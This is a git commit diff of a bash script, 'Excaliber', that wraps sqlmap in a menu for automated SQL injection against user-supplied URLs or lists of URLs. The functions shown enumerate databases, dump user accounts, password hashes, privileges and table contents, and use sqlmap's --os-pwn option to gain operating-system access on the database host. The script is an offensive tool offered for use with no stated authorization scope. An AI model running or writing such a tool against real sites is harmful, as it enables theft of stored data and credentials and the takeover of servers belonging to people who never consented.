13a1aeb8b6d547989b831265312bc155726abd1f
Blkzer0 <31668190+Blkzer0@users.noreply.github.com>
2017-10-18 22:21:12 -0400

    Update excal.sh
    Cleaned code

--- excal.sh
+++ excal.sh
@@ -1,8 +1,33 @@
 #!/bin/bash
-#Codename: Excaliber V 1.1
-## Script (Automated Sqlmap ) is for quick recon. All parmeters are set for quick and accurate retrieval of database information. 
 
-function back(){
+scan(){
+read -p "Target URL:" target
+sqlmap -u $target --random-agent --level=3 --risk=2 -o --skip-static --is-dba --privileges --roles --users --passwords --fingerprint --dbs --batch --dbms="mysql,mssql"
+database
+}
+
+list(){
+read -p "Path to list?:" list
+sqlmap -m $list --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --batch --technique=BE --beep --dbms="mysql,mssql"
+database
+}
+
+database(){
+read -p "<URL:-->" target  
+read -p "<DB:--->" db
+sqlmap -u $target --random-agent --level=3 --risk=2 -D $db --tables --count --threads 6 --batch #--hex
+read -p " What kind of tables to search?:" tables
+sqlmap -u $target --random-agent -D $db -T $tables --columns --dump --threads 7
+back 
+}
+
+pwn(){
+read -p "URL Of DBA:" url
+sqlmap -u $url --random-agent --leve=5 --risk=3 --os-pwn
+back
+}
+
+back(){
 read -p "Do you want to return to main menu? [y,n]:" back
 if [ $back == 'y' ]
 then
@@ -13,150 +38,68 @@ exit
 fi
 }
 
-function fast(){
-read -p "Enter URL of target:" url
-sqlmap -u $url --random-agent --level=4 --risk=2 --all --threads 6
-back
-}
-
-function list(){
-read -p "Are you scanning a list or single target [l/t]?" input
-if [ $input == 'l' ]
-then
-read -p  "what is the path to list?:" list
-sqlmap -m $list --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --batch --technique=BE
-back
-elif [ $input == 't' ] 
-then
-read -p "what is the target url?:" url
-sqlmap -u $url --random-agent --level=3 --risk=2 -o --skip-static --is-dba --dbs --batch
-back 
-fi
-}
-
-function database(){
-read -p "<[URL]>:" url   
-read -p "<[DB]>:" db
-sqlmap -u $url --random-agent -D $db --tables --count --threads 6 #--hex
-read -p " What kind of tables to search?:" tables
-sqlmap -u $url --random-agent -D $db -T $tables --columns --dump --threads 7
-back
- #--hex --batch 
-}
-
-function recon(){
-read -p " what is the url of target?:" target
-sqlmap -u $target --random-agent --level=3 --risk=2 -o -b --is-dba --privileges --roles --users --passwords --fingerprint --dbs --tables --columns --count --threads 7
-back
-}
-
-function pwn(){
-read -p "Is DBA Root?:" choice
-if [ $choice == 'y' ] 
-then
-read -p "What is the url?:" root
-sqlmap -u "$root" --random-agent --leve=5 --risk=3 --os-pwn
-elif [ $choice == 'n' ] 
-then
-menu
-fi   
-}
-
-function custom(){
-read -p " What is the url?:" url
-read -p " What DB you want to search?:" db
-read -p " What Table/s you want to search?:" table
-sqlmap -u $url --random-agent --level=3 --risk=2 -D $db -T $table --columns --dump --threads 6
-back
-} 
-
-function menu(){
+menu(){
 echo "======================================="
-echo "[1] Perform Scan Of Target"
-echo "[2] Perform Scan Of Database and Tables"
-echo "[3] Perform Full Scan Of Database"
-echo "[4] Perform PWN on Database(DBA is Root)"
-echo "[5] Retreive All Info of This Webserver"
-echo "[6] Perform Custom Search"
+echo "[1] Scan Target"
+echo "[2] Scan List"
+echo "[3] Scan Database"
+echo "[4] PWN DBA"
 echo "[0] Exit" 
 echo "======================================="
-read -p "What is your choice?:" choice
+read -p "Choice:" choice
 if [ $choice == '1' ] 
 then
-list
+scan
 elif [ $choice == '2' ]
 then
-database
+list
 elif [ $choice == '3' ]
 then
-recon
+database
 elif [ $choice == '4' ]
 then
 pwn
-elif [ $choice == '5' ]
-then
-fast
-elif [ $choice == '6' ]
-then
-custom
 elif [ $choice == '0' ]
 then
 clear
 exit
 fi
-
 }
-
-###############################
-###########Banner##############
-###############################
-echo ""
+## BANNER ##
+echo "=============================================================================="
 echo "                /v                                                            "
 echo "               /(W                                                            "
 echo "              /<M-                                                            "
-echo "\~b__________.$|\----------------------------------------------------------. "
-echo " >@)=======($( )#H>====================================================----->"
-echo "/_p~~~~~~~~~~.$|/----------------------------------------------------------' "
+echo " \~b__________.$|\----------------------------------------------------------. "
+echo "  >@)=======($( )#H>====================================================---------> "
+echo " /_p~~~~~~~~~~.$|/----------------------------------------------------------' "
 echo "              \<M-                                                            "
 echo "               \(B                                                            " 
 echo "                \?                                                            "
-echo ""
-echo "      Getting Injections Ready                     "
-echo "      ##Codedname: Excaliber V1"
-sleep 1
-echo "<======================================>"
-echo "  Automated Sql Injections via SQLMap "
-echo "<======================================>"
-echo "[1] Perform Scan Of Target"
-echo "[2] Perform Scan Of Database and Tables"
-echo "[3] Perform Full Scan Of Database"
-echo "[4] Perform PWN on Database(DBA is Root)"
-echo "[5] Retreive All Info of This Webserver"
-echo "[6] Perform Custom Search"
+echo "                                                                              "
+echo "                   Getting Injections Ready                                   "
+echo "                   Codename: Excaliber V1.2                                   "
+echo "=============================================================================="
+echo "[1] Scan Target"
+echo "[2] Scan List"
+echo "[3] Scan Database"
+echo "[4] PWN DBA"
 echo "[0] Exit" 
-echo "<======================================>"
-read -p "What is your choice?:" choice
+echo "======================================="
+read -p "Choice:" choice
 if [ $choice == '1' ] 
 then
-list
+scan
 elif [ $choice == '2' ]
 then
-database
+list
 elif [ $choice == '3' ]
 then
-recon
+database
 elif [ $choice == '4' ]
 then
 pwn
-elif [ $choice == '5' ]
-then
-fast
-elif [ $choice == '6' ]
-then
-custom
 elif [ $choice == '0' ]
 then
-clear
-exit
-
+exit 0
 fi
